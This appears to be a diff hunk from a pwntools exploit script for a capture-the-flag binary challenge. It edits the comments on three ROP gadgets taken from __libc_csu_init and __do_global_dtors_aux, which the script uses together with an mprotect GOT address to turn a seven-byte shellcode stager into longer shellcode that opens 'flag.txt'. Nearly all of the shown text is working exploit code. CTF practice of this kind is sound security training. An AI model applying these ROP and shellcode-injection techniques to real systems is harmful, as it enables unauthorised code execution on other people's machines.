@@ -28,9 +28,9 @@ seven_byte_shellcode = asm('''
 p.send(seven_byte_shellcode)
 
 # 2. use three special gadgets to ROP for long shellcode injection
-GADGET_1 = 0x401362  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
-GADGET_2 = 0x401348  # mov rdx, r15; mov rsi, r14; mov edi, r13; call qword ptr [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 0x401348; add rsp, 0x8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
-GADGET_3 = 0x401218  # add dword ptr [rbp - 0x3d], ebx; nop dword ptr [rax + rax]; ret;
+GADGET_1 = 0x401362  # __libc_csu_init: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+GADGET_2 = 0x401348  # __libc_csu_init: mov rdx, r15; mov rsi, r14; mov edi, r13; call qword ptr [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 0x401348; add rsp, 0x8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+GADGET_3 = 0x401218  # __do_global_dtors_aux: add dword ptr [rbp-0x3d], ebx; nop dword ptr [rax+rax]; ret;
 MPROTECT_GOT = 0x403fe8
 shellcode = asm('''
     /* push filename 'flag.txt\x00' to stack */
